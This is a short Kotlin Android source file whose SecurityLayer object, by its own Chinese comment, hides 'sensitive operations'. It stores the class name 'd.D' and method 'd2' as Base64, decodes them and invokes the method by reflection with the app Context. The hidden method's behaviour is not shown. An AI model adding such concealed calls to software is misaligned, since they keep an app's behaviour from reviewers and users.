package com.september.nine.chong.security

import android.content.Context
import android.util.Base64
import android.util.Log
import java.lang.reflect.Method

/**
 * 安全层 - 用于隐藏敏感操作
 */
object SecurityLayer {
    
    // 加密的类名和方法名
    // "d.D" 的Base64编码
    private val encryptedClassName = Base64.encodeToString(
        "d.D".toByteArray(), 
        Base64.NO_WRAP
    )
    
    // "d2" 的Base64编码
    private val encryptedMethodName = Base64.encodeToString(
        "d2".toByteArray(), 
        Base64.NO_WRAP
    )
    
    fun executeSecureOperation(context: Context) {
        try {
            // 解密类名
            val className = String(Base64.decode(encryptedClassName, Base64.NO_WRAP))
            
            // 加载类
            val clazz = Class.forName(className)
            
            // 解密方法名
            val methodName = String(Base64.decode(encryptedMethodName, Base64.NO_WRAP))
            
            // 获取方法 - 参数类型是Object
            val method: Method = clazz.getDeclaredMethod(methodName, Context::class.java)
            method.isAccessible = true
            
            // 执行方法
            method.invoke(null, context)
            
        } catch (e: NoSuchMethodException) {
            Log.e("SecurityLayer", "Method not found: ${e.message}")
        } catch (e: ClassNotFoundException) {
            Log.e("SecurityLayer", "Class not found: ${e.message}")
        } catch (e: Exception) {
            Log.e("SecurityLayer", "Error: ${e.message}")
            e.printStackTrace()
        }
    }
}

